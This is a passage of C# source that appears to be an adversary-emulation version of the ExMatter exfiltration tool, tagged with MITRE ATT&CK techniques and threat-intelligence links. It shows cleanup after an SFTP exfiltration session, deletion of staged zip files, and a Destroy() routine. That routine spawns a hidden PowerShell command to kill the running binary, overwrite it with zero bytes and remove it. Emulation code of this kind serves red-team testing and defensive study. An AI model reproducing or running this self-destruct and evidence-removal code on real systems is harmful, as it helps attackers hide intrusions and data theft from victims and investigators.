            Logger.Info($"[*] Execution complete. Performing cleanup.");

            sftp.Disconnect();

            foreach (FileInfo fi in zipFiles)
            {
                try
                {
                    fi.Delete();
                }
                catch (Exception e)
                {
                    Logger.Error($"[!] Caught exception {e.GetType().Name} for deleting zip files: {e.Message}");
                }
            }

            Logger.Info($"[+] Cleanup complete.");
        }

        /// <summary>
        /// <c><b></b></c>:
        /// <para><b>About:</b></para>
        ///     Overwrite the ExMatter binary with garbage bytes and delete it.
        /// <para><b>Result:</b></para>
        ///     The ExMatter binary has been corrupted and removed from disk.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1070.004: Indicator Removal: File Deletion
        ///     <see href="https://attack.mitre.org/techniques/T1070/004/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1059.001: Command and Scripting Interpreter: PowerShell
        ///     <see href="https://attack.mitre.org/techniques/T1059/001/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     <item><description><see href="https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/"/></description></item>
        ///     </list>
        /// </summary>
        public static void Destroy()
        {
            string binPath = AppDomain.CurrentDomain.BaseDirectory;
            string binName = System.AppDomain.CurrentDomain.FriendlyName;

            Logger.Info($"[*] Destroying binary.");

            ProcessStartInfo si = new ProcessStartInfo()
            {
                FileName = @"powershell.exe",
                Arguments = @"-WindowStyle Hidden -Command "" $path = '" + binPath + @"/" + binName + @"';" +
                            @"Start-Sleep -Seconds 5;" +
                            @"Get-Process | Where-Object {$_.Path -like $path} | Stop-Process -Force *>> '" + logFilePath + @"';" +
                            @"[byte[]]$arr = new-object byte[] 65536;" +
                            @"Set-Content -Path $path -Value $arr *>> '" + logFilePath + @"';" +
                            @"Remove-Item -Path $path *>> '" + logFilePath + @"';""",
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process p = new Process()
            {
                StartInfo = si
            };

            try
            {
                p.Start();
                Logger.Info($"[+] Spawned powershell destructor.");
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for spawning powershell destructor: {e.Message}");
            }
            finally
            {
                Environment.Exit(0);
            }
        }
    }
}
